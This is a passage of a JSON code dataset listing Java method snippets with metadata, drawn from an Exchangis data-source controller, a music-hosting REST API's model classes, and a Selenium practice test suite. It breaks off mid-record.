{"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getName() {            return name;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/MetaPartitionInfo.java", "stars": "23", "class": {"name": "PartitionNode", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setName(String name) {            this.name = name;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/MetaPartitionInfo.java", "stars": "23", "class": {"name": "PartitionNode", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getPartitions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,PartitionNode>", "snippet": "        public Map<String, PartitionNode> getPartitions() {            return partitions;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/MetaPartitionInfo.java", "stars": "23", "class": {"name": "PartitionNode", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setPartitions", "params": ["Map<String,PartitionNode>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setPartitions(Map<String, PartitionNode> partitions) {            this.partitions = partitions;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/domain/MetaPartitionInfo.java", "stars": "23", "class": {"name": "PartitionNode", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "printStackTrace", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void printStackTrace() {        super.printStackTrace();    }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-service/src/main/java/com/upgrad/musichoster/service/exception/UploadFailedException.java", "stars": "2", "class": {"name": "UploadFailedException", "extends": "Exception", "implements": null, "modifiers": ["public"]}}, {"method_name": "printStackTrace", "params": ["PrintStream"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void printStackTrace(PrintStream s) {        super.printStackTrace(s);    }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-service/src/main/java/com/upgrad/musichoster/service/exception/UploadFailedException.java", "stars": "2", "class": {"name": "UploadFailedException", "extends": "Exception", "implements": null, "modifiers": ["public"]}}, {"method_name": "printStackTrace", "params": ["PrintWriter"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void printStackTrace(PrintWriter s) {        super.printStackTrace(s);    }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-service/src/main/java/com/upgrad/musichoster/service/exception/UploadFailedException.java", "stars": "2", "class": {"name": "UploadFailedException", "extends": "Exception", "implements": null, "modifiers": ["public"]}}, {"method_name": "setUpMethod", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUpMethod() {        driver = WebDriverFactory.getDriver(\"chrome\");        driver.manage().window().maximize();    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "afterMethod", "params": [], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void afterMethod () throws InterruptedException {        Thread.sleep(3000);        driver.quit();    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testActions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testActions(){        driver.get(\"http://omayo.blogspot.com/\");        Actions actions = new Actions(driver);        WebElement blogsmenu = driver.findElement(By.id(\"blogsmenu\"));        actions.moveToElement(blogsmenu).perform();        driver.findElement(By.xpath(\"//span[.='Selenium143']\")).click();        driver.navigate().back();        WebElement multiSelectBox = driver.findElement(By.id(\"multiselect1\"));        Select multiSelect = new Select(multiSelectBox);        List<WebElement> options = multiSelect.getOptions();        for (WebElement option : options) {            System.out.println(option.getText());        }        WebElement drop1CheckBox = driver.findElement(By.id(\"drop1\"));        Select drop1Select = new Select(drop1CheckBox);        drop1Select.selectByVisibleText(\"doc 2\");        String displayedText = drop1Select.getFirstSelectedOption().getText();        Assert.assertEquals(displayedText, \"doc 2\");    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testDropBox", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testDropBox(){        driver.get(\"http://omayo.blogspot.com/\");        WebElement multiSelectBox = driver.findElement(By.id(\"multiselect1\"));        Select multiSelect = new Select(multiSelectBox);        List<WebElement> options = multiSelect.getOptions();        for (WebElement option : options) {            System.out.println(option.getText());        }        WebElement drop1DropBox = driver.findElement(By.id(\"drop1\"));        Select drop1Select = new Select(drop1DropBox);        drop1Select.selectByVisibleText(\"doc 2\");        String displayedText = drop1Select.getFirstSelectedOption().getText();        Assert.assertEquals(displayedText, \"doc 2\");    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testJSE", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testJSE(){        driver.get(\"http://omayo.blogspot.com/\");        //driver.manage().window().setPosition(new Point(0,20));        Actions actions = new Actions(driver);        JavascriptExecutor jse = (JavascriptExecutor)driver;        jse.executeScript(\"window.scrollBy(0, 250);\");        driver.findElement(By.id(\"ta1\")).sendKeys(\"Hey here it is the text\");        jse.executeScript(\"window.scrollBy(0, 250);\");        WebElement textBox2 = driver.findElement(By.xpath(\"(//textarea)[2]\"));        textBox2.clear();        textBox2.sendKeys(\"My name is Simon\");        WebElement disabledBox = driver.findElement(By.id(\"tb2\"));        String str = \" typing\";        jse.executeScript(\"arguments[0].setAttribute('value', '\" + str +\"')\",disabledBox);    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testFrame", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testFrame(){        driver.get(\"http://omayo.blogspot.com/\");        driver.switchTo().frame(\"iframe1\");        String hotels = driver.findElement(By.linkText(\"Hotels\")).getText();        System.out.println(\"hotels = \" + hotels);        driver.switchTo().parentFrame();        driver.switchTo().frame(2);        driver.findElement(By.id(\"q\")).sendKeys(\"hey\");        List<WebElement> chapters = driver.findElements(By.partialLinkText(\"Chapter\"));        for (WebElement chapter : chapters) {            System.out.println(chapter.getText());        }    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testAlerts", "params": [], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testAlerts() throws InterruptedException {        driver.get(\"http://omayo.blogspot.com/\");        driver.findElement(By.id(\"alert1\")).click();        Alert alert = driver.switchTo().alert();        alert.accept();        driver.findElement(By.id(\"prompt\")).click();        Thread.sleep(2000);        alert.sendKeys(\"name\");        Thread.sleep(2000);        alert.accept();        driver.findElement(By.id(\"confirm\")).click();        alert.accept();    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testCheckBox", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCheckBox(){        driver.get(\"http://omayo.blogspot.com/\");        JavascriptExecutor jse = (JavascriptExecutor)driver;        jse.executeScript(\"window.scrollBy(0, 250);\");        WebElement orange = driver.findElement(By.id(\"checkbox1\"));        WebElement blue = driver.findElement(By.id(\"checkbox2\"));        Assert.assertTrue(orange.isSelected());        Assert.assertFalse(blue.isSelected());        orange.click();        blue.click();        Assert.assertFalse(orange.isSelected());        Assert.assertTrue(blue.isSelected());    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testTest(){        driver.get(\"http://omayo.blogspot.com/\");        driver.findElement(By.name(\"textboxn\")).sendKeys(\"Hi i am writing\");        driver.findElement(By.className(\"classone\")).sendKeys(\"Hi i am writing\");        driver.findElement(By.xpath(\"(//input[@class='classone'])[2]\")).sendKeys(\"say my name\");    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRadio", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRadio(){        driver.get(\"http://omayo.blogspot.com/\");        List<WebElement> vehicles = driver.findElements(By.name(\"vehicle\"));        for (WebElement vehicle : vehicles) {            vehicle.click();            Assert.assertTrue(vehicle.isSelected());        }    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testActions2", "params": [], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testActions2() throws InterruptedException {        driver.get(\"http://omayo.blogspot.com/\");        WebElement doubleclickTarget = driver.findElement(By.xpath(\"//button[.=' Double click Here   ']\"));        JavascriptExecutor jse = (JavascriptExecutor)driver;        Thread.sleep(500);        jse.executeScript(\"window.scrollBy(0, 750);\");        Thread.sleep(500);        jse.executeScript(\"window.scrollBy(0, 950);\");        Actions action = new Actions(driver);        action.doubleClick(doubleclickTarget).perform();        Alert alert = driver.switchTo().alert();        Thread.sleep(1000);        alert.accept();    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testWait", "params": [], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testWait() throws InterruptedException {        driver.get(\"http://omayo.blogspot.com/\");        WebDriverWait wait = new WebDriverWait(driver, 10);        driver.findElement(By.className(\"dropbtn\")).click();        //WebElement facebook = driver.findElement(By.cssSelector(\".dropbtn~div>a:nth-of-type(1)\"));        List<WebElement> elements = driver.findElements(By.cssSelector(\".dropbtn~div>a\"));        wait.until(ExpectedConditions.visibilityOfAllElements(elements));        System.out.println(elements.size());        for (WebElement element : elements) {            System.out.println(element.getText());        }    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testWait2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testWait2(){        driver.get(\"http://omayo.blogspot.com/\");        driver.findElement(By.xpath(\"//button[.='Check this']\")).click();        WebDriverWait wait = new WebDriverWait(driver,15);        WebElement dte = driver.findElement(By.id(\"dte\"));        wait.until(ExpectedConditions.elementToBeClickable(dte));        dte.click();        Assert.assertTrue(dte.isSelected());    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testLists", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public  void testLists(){        driver.get(\"http://omayo.blogspot.com/\");        List<WebElement> elements = driver.findElements(By.cssSelector(\"#HTML25>div>ol>li\"));        for (int i = 0; i < arr.length; i++) {             arr[i]= elements.get(i).getText();        }        System.out.println(Arrays.toString(arr));        List<WebElement> elements2 = driver.findElements(By.cssSelector(\"#HTML26>div>ul>li\"));        for (int i = 0; i < arr.length; i++) {            arr[i]= elements2.get(i).getText();        }        System.out.println(Arrays.toString(arr));    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testPupUpWindow", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testPupUpWindow(){        driver.get(\"http://omayo.blogspot.com/\");        driver.findElement(By.partialLinkText(\"popup w\")).click();        String currentHandle = driver.getWindowHandle();        Set<String> windowHandles = driver.getWindowHandles();        for (String handle : windowHandles) {            if(!handle.equals(currentHandle)){                driver.switchTo().window(handle);            }        }        System.out.println(driver.findElement(By.id(\"para1\")).getText());        System.out.println(driver.findElement(By.id(\"para2\")).getText());    }", "url": "https://raw.githubusercontent.com/vatanhorasan/myStudies/master/src/test/java/com/cybertek/tests/myStudies/Omayo.java", "stars": "2", "class": {"name": "Omayo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "id", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "UpdateMusicResponse", "snippet": "  public UpdateMusicResponse id(Integer id) {    this.id = id;    return this;  }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/com/upgrad/musichoster/api/model/UpdateMusicResponse.java", "stars": "2", "class": {"name": "UpdateMusicResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "  public Integer getId() {    return id;  }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/com/upgrad/musichoster/api/model/UpdateMusicResponse.java", "stars": "2", "class": {"name": "UpdateMusicResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setId(Integer id) {    this.id = id;  }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/com/upgrad/musichoster/api/model/UpdateMusicResponse.java", "stars": "2", "class": {"name": "UpdateMusicResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "status", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "UpdateMusicResponse", "snippet": "  public UpdateMusicResponse status(String status) {    this.status = status;    return this;  }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/com/upgrad/musichoster/api/model/UpdateMusicResponse.java", "stars": "2", "class": {"name": "UpdateMusicResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getStatus() {    return status;  }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/com/upgrad/musichoster/api/model/UpdateMusicResponse.java", "stars": "2", "class": {"name": "UpdateMusicResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setStatus", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setStatus(String status) {    this.status = status;  }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/com/upgrad/musichoster/api/model/UpdateMusicResponse.java", "stars": "2", "class": {"name": "UpdateMusicResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "equals", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean equals(java.lang.Object o) {    if (this == o) {      return true;    }    if (o == null || getClass() != o.getClass()) {      return false;    }    UpdateMusicResponse updateMusicResponse = (UpdateMusicResponse) o;    return Objects.equals(this.id, updateMusicResponse.id) &&        Objects.equals(this.status, updateMusicResponse.status);  }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/com/upgrad/musichoster/api/model/UpdateMusicResponse.java", "stars": "2", "class": {"name": "UpdateMusicResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hashCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int hashCode() {    return Objects.hash(id, status);  }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/com/upgrad/musichoster/api/model/UpdateMusicResponse.java", "stars": "2", "class": {"name": "UpdateMusicResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {    StringBuilder sb = new StringBuilder();    sb.append(\"class UpdateMusicResponse {\\n\");        sb.append(\"    id: \").append(toIndentedString(id)).append(\"\\n\");    sb.append(\"    status: \").append(toIndentedString(status)).append(\"\\n\");    sb.append(\"}\");    return sb.toString();  }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/com/upgrad/musichoster/api/model/UpdateMusicResponse.java", "stars": "2", "class": {"name": "UpdateMusicResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toIndentedString", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String toIndentedString(java.lang.Object o) {    if (o == null) {      return \"null\";    }    return o.toString().replace(\"\\n\", \"\\n    \");  }", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/target/generated-sources/com/upgrad/musichoster/api/model/UpdateMusicResponse.java", "stars": "2", "class": {"name": "UpdateMusicResponse", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBaseService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IBaseService<DataSource>", "snippet": "    public IBaseService<DataSource> getBaseService() {        return dataSourceService;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init(){        security.registerUserExternalDataAuthGetter(DataSource.class, userName -> {            UserInfo userInfo = userInfoService.selectByUsername(userName);            if(userInfo.getUserType() >= UserRole.MANGER.getValue()){                //Not limit                return null;            }            return groupService.queryGroupRefProjectsByUser(userName);        });        security.registerExternalDataAuthGetter(DataSource.class, dataSource -> {            if (null == dataSource){                return Collections.emptyList();            }            return Collections.singletonList(String.valueOf(dataSource.getProjectId()));        });        security.registerExternalDataAuthScopeGetter(DataSource.class, dataSource -> {            if(null == dataSource || dataSource.getId() <= 0){                return new ArrayList<>();            }            List<DataAuthScope> permissions = dataSourceService.getPermission(dataSource.getId());            permissions.add(DataAuthScope.READ);            return permissions;        });    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "errorParameterHandler", "params": ["ConnParamsInValidException"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> errorParameterHandler(ConnParamsInValidException e){        return new Response<>().errorResponse(CodeConstant.PARAMETER_ERROR, null, e.getMessage());    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "connectionCheck", "params": ["String", "MultipartFile", "DataSource", "BindingResult", "HttpServletResponse"], "throws": null, "modifiers": ["public"], "return_type": "Response<Object>", "snippet": "    public Response<Object> connectionCheck(@PathVariable(\"type\") String type,                                             @RequestParam(value = \"authFile\", required = false) MultipartFile authFile,                                            @Validated DataSource dataSource, BindingResult result,                                            HttpServletResponse resp) {        if (result.hasErrors()) {            return new Response<>().errorResponse(CodeConstant.PARAMETER_ERROR, null,                    result.getFieldErrors().get(0).getDefaultMessage());        }        DataSourceConnCheck connCheck = AbstractDataSourceConnCheck.getConnCheck(type, resp);        if (null == connCheck) {            return new Response<>().errorResponse(CodeConstant.DATASOURCE_CHECK_NOT_EXISTS, null, super.informationSwitch(\"exchange.data_source.check.not.exists\"));        }        dataSource.setSourceType(type);        if(dataSource.getId() > 0){           DataSource dataSource1 = dataSourceService.getDecryptedSimpleOne(dataSource.getId());           if(StringUtils.isBlank(dataSource.getAuthCreden()) && StringUtils.isNotBlank(dataSource.getAuthEntity())){               dataSource.setAuthCreden(dataSource1.getAuthCreden());           }        }        if(null != dataSource.getModelId()) {            dataSourceService.fillDataSourceWithModel(dataSource, dataSource.getModelId());        }        File authFileTmp = null;        try {            if (null != authFile && !authFile.isEmpty() && null != authFile.getOriginalFilename()) {                authFileTmp = new File(conf.getStoreTmp() + AppUtil.newFileName(authFile.getOriginalFilename()));                if(new File(conf.getStoreTmp()).mkdirs()){                    LOG.info(\"Created temporary dir: \" + conf.getStoreTmp());                }                if (authFileTmp.createNewFile()) {                    FileUtils.copyInputStreamToFile(authFile.getInputStream(), authFileTmp);                }            }        }catch (IOException e) {            LOG.error(\"IO_ERROR: Transforming 'authFile' input stream to temp file error, message: \" + e.getMessage(), e);            throw new EndPointException(super.informationSwitch(\"exchange.data_source.systematic.io.anomaly\"),  e);        }        try {            boolean ok = true;            String alarm = \"\";            String message = \"\";            try {                LOG.info(Json.toJson(dataSource, null));                connCheck.check(dataSource, authFileTmp);            } catch (Exception e) {                LOG.info(\"Connection check failed: \" + e.getMessage());                LOG.error(e.getMessage(), e);                message = e.getMessage();                if(StringUtils.isNotBlank(message)){                    alarm = super.informationSwitch(\"exchange.data_source.connection.error\");                }                ok = false;            }            return ok ? new Response<>().successResponse(null) :                    new Response<>().errorResponse(CodeConstant.DATASOURCE_CONN_ERROR, null, alarm, message);        } finally {            if (null != authFileTmp) {                if(!authFileTmp.delete()){                   LOG.error(\"IO_ERROR: delete temp file Failed, Path: [\" + authFileTmp.getPath()+\"]\");                }            }        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "authFileDownload", "params": ["HttpServletRequest", "HttpServletResponse", "String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void authFileDownload(HttpServletRequest request,                           HttpServletResponse response, @PathVariable(\"auth\")String authPrefix) throws IOException {        String path = getPathFromReq(request, authPrefix);        if(null == path){            response.setStatus(HttpStatus.BAD_REQUEST.value());            return;        }        FileSystemResource fsResource = new FileSystemResource(path);        if (fsResource.exists() && fsResource.isReadable()) {            String name = \"auth\";            response.setContentType(\"application/octet-stream\");            response.setContentLengthLong(fsResource.contentLength());            response.setHeader(\"Content-Disposition\",                    String.format(\"attachment;filename=\\\"%s\\\"\", name));            try (InputStream inputStream = fsResource.getInputStream()) {                IOUtils.copy(inputStream, response.getOutputStream());            }            String fileName = fsResource.getFilename();            if(StringUtils.isNotBlank(fileName) && fileName.startsWith(DataSourceServiceImpl.PERSIST_DISPOSABLE_PREFIX)){                if(!fsResource.getFile().delete()){                    LOG.error(\"IO_ERROR: delete disposable auth file Failed, Path:[\" + fsResource.getPath()+\"]\");                }            }        } else {            response.setContentType(\"application/json;charset=utf-8\");            response.getWriter().write(Objects.requireNonNull(Json.toJson(new Response<>().errorResponse(CodeConstant.FILE_NOT_FOUND, null,                    super.informationSwitch(\"exchange.data_source.invalid.file.path\")), Response.class)));        }        response.flushBuffer();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "authFileRemove", "params": ["HttpServletRequest", "HttpServletResponse", "String"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Response<Boolean>", "snippet": "    public Response<Boolean> authFileRemove(HttpServletRequest request,                                                       HttpServletResponse response,                                      @PathVariable(\"auth\")String authPrefix) throws IOException{        String path = getPathFromReq(request, authPrefix);        FileSystemResource fsResource = new FileSystemResource(path);        if(fsResource.exists()){            if(fsResource.getFile().delete()){                return new Response<Boolean>().successResponse(true);            }        }        return new Response<Boolean>().errorResponse(CodeConstant.FILE_NOT_FOUND, false, super.informationSwitch(\"exchange.data_source.file.notFind\"));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "add", "params": ["DataSource", "HttpServletRequest"], "throws": null, "modifiers": ["public"], "return_type": "Response<DataSource>", "snippet": "    public Response<DataSource> add(@Valid @RequestBody DataSource t, HttpServletRequest request) {        return add(null, t, null, request, null);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "add", "params": ["MultipartFile", "DataSource", "BindingResult", "HttpServletRequest", "HttpServletResponse"], "throws": null, "modifiers": ["public"], "return_type": "Response<DataSource>", "snippet": "    public Response<DataSource> add(            @RequestParam(value = \"authFile\", required = false) MultipartFile authFile,            @Validated DataSource dataSource, BindingResult result, HttpServletRequest request, HttpServletResponse resp) {        if (null != result && result.hasErrors()) {            return new Response<DataSource>().errorResponse(CodeConstant.PARAMETER_ERROR, null,                    result.getFieldErrors().get(0).getDefaultMessage());        }        File storeFile = null;        String path = null;        DataSourceConnCheck connCheck = AbstractDataSourceConnCheck.getConnCheck(dataSource.getSourceType(), resp);        if (null == connCheck) {            return null;        }        security.bindUserInfo(dataSource, request);        if(StringUtils.isNotBlank(dataSource.getCreateUser())                && isDuplicate(dataSource.getSourceName(), dataSource.getCreateUser())){            return new Response<DataSource>().errorResponse(CodeConstant.PARAMETER_ERROR, null, super.informationSwitch(\"exchange.data_source.with.same.name\"));        }        if( null != dataSource.getModelId() ){            if(!modelService.exist(dataSource.getModelId())) {                return new Response<DataSource>().errorResponse(CodeConstant.PARAMETER_ERROR, null, super.informationSwitch(\"udes.datasource.invalid.datasource.id\"));            }            dataSourceService.fillDataSourceWithModel(dataSource, dataSource.getModelId());        }        try {            if (null != authFile && !authFile.isEmpty()) {                String authType = String.valueOf(dataSource.getParameterMap().get(Constants.PARAM_AUTH_TYPE));                storeFile = dataSourceService.store(authFile, authType);                path = AppUtil.getIpAndPort() + conf.getStoreUrl(authType) + storeFile.getName();            }            if (null != path) {                dataSource.setAuthCreden(path);            }            dataSource.setSourceName(StringEscapeUtils.escapeHtml3(dataSource.getSourceName()));            dataSource.setSourceDesc(dataSource.getSourceDesc());            //Validate if the parameter is json structure            Json.fromJson(dataSource.getParameter(), Map.class, String.class, Object.class);            boolean ok = getBaseService().add(dataSource);            return ok ? new Response<DataSource>().successResponse(null) :                    new Response<DataSource>().errorResponse(CodeConstant.DATASOURCE_ADD_ERROR, null, super.informationSwitch(\"exchange.data_source.add.failed\"));        } catch (Exception e) {            if (null != storeFile) {                if(!storeFile.delete()){                    LOG.error(\"IO_ERROR: delete store file Failed, Path: [\" + storeFile.getPath()+\"]\");                }            }            if(e instanceof  ConnParamsInValidException){                throw (ConnParamsInValidException)e;            }            throw new RuntimeException(e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "update", "params": ["DataSource", "HttpServletRequest"], "throws": null, "modifiers": ["public"], "return_type": "Response<DataSource>", "snippet": "    public Response<DataSource> update(@Valid @RequestBody DataSource dataSource, HttpServletRequest request) {        return update(null, dataSource,  null, request, null);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/datasource/controller/DataSourceController.java", "stars": "23", "class": {"name": "DataSourceController", "extends": "AbstractGenericController", "implements": null, "modifiers": ["public"]}}, {"method_name": "update", "params": 